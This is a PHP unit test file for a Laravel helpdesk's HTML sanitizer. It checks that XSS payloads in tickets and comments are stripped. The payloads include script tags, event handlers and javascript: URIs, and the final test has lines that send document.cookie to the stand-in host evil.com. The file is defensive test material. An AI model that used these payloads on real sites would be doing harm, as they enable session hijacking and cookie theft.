<?php

namespace Tests\Unit;

use App\Models\Comment;
use App\Models\Ticket;
use App\Services\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class HtmlSanitizerTest extends TestCase
{
    use RefreshDatabase;

    public function test_strips_script_tags(): void
    {
        $html = '<p>Hello</p><script>alert("xss")</script>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('<script>', $clean);
        $this->assertStringNotContainsString('alert', $clean);
        $this->assertStringContainsString('<p>Hello</p>', $clean);
    }

    public function test_strips_onerror_handler(): void
    {
        $html = '<img src=x onerror="alert(1)">';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('alert', $clean);
    }

    public function test_strips_onclick_handler(): void
    {
        $html = '<div onclick="steal()">Click</div>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('onclick', $clean);
        $this->assertStringNotContainsString('steal', $clean);
    }

    public function test_strips_javascript_href(): void
    {
        $html = '<a href="javascript:alert(1)">Click</a>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('javascript:', $clean);
    }

    public function test_strips_data_uri(): void
    {
        $html = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('data:text/html', $clean);
    }

    public function test_strips_iframe(): void
    {
        $html = '<iframe src="https://evil.com"></iframe>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('<iframe', $clean);
    }

    public function test_strips_style_tags(): void
    {
        $html = '<style>body { background: url("https://evil.com/track") }</style><p>Hi</p>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('<style', $clean);
        $this->assertStringContainsString('Hi', $clean);
    }

    public function test_strips_object_and_embed(): void
    {
        $html = '<object data="evil.swf"></object><embed src="evil.swf">';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringNotContainsString('<object', $clean);
        $this->assertStringNotContainsString('<embed', $clean);
    }

    public function test_preserves_safe_html(): void
    {
        $html = '<p>Hello <strong>world</strong></p><ul><li>Item</li></ul>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringContainsString('<p>Hello <strong>world</strong></p>', $clean);
        $this->assertStringContainsString('<li>Item</li>', $clean);
    }

    public function test_preserves_safe_links(): void
    {
        $html = '<a href="https://example.com">Link</a>';
        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringContainsString('https://example.com', $clean);
    }

    public function test_handles_null_and_empty(): void
    {
        $this->assertEquals('', HtmlSanitizer::sanitize(null));
        $this->assertEquals('', HtmlSanitizer::sanitize(''));
    }

    public function test_ticket_sanitized_body_preserves_original(): void
    {
        $malicious = '<p>Help</p><script>alert("xss")</script>';

        $ticket = Ticket::create([
            'subject' => 'Test',
            'body' => $malicious,
            'requester_name' => 'Test',
            'requester_email' => 'test@example.com',
        ]);

        // Original body is preserved in DB
        $this->assertEquals($malicious, $ticket->body);

        // Sanitized accessor strips the script
        $this->assertStringNotContainsString('<script>', $ticket->sanitized_body);
        $this->assertStringContainsString('<p>Help</p>', $ticket->sanitized_body);
    }

    public function test_comment_sanitized_body_preserves_original(): void
    {
        $ticket = Ticket::create([
            'subject' => 'Test',
            'requester_name' => 'Test',
            'requester_email' => 'test@example.com',
        ]);

        $malicious = '<div onclick="steal()">Reply</div><img src=x onerror="alert(1)">';
        $comment = $ticket->comments()->create([
            'body' => $malicious,
            'type' => 'reply',
            'is_internal' => false,
        ]);

        // Original body is preserved
        $this->assertEquals($malicious, $comment->body);

        // Sanitized accessor strips event handlers
        $this->assertStringNotContainsString('onclick', $comment->sanitized_body);
        $this->assertStringNotContainsString('onerror', $comment->sanitized_body);
        $this->assertStringContainsString('Reply', $comment->sanitized_body);
    }

    public function test_combined_attack_vector(): void
    {
        $html = '<p>Normal text</p>'
            .'<script>document.location="https://evil.com/?c="+document.cookie</script>'
            .'<img src=x onerror="fetch(\'https://evil.com\',{method:\'POST\',body:document.cookie})">'
            .'<a href="javascript:void(0)" onclick="steal()">Click here</a>'
            .'<div style="background:url(javascript:alert(1))">Styled</div>';

        $clean = HtmlSanitizer::sanitize($html);

        $this->assertStringContainsString('Normal text', $clean);
        $this->assertStringNotContainsString('<script>', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
        $this->assertStringNotContainsString('onclick', $clean);
        $this->assertStringNotContainsString('javascript:', $clean);
        $this->assertStringNotContainsString('document.cookie', $clean);
    }
}
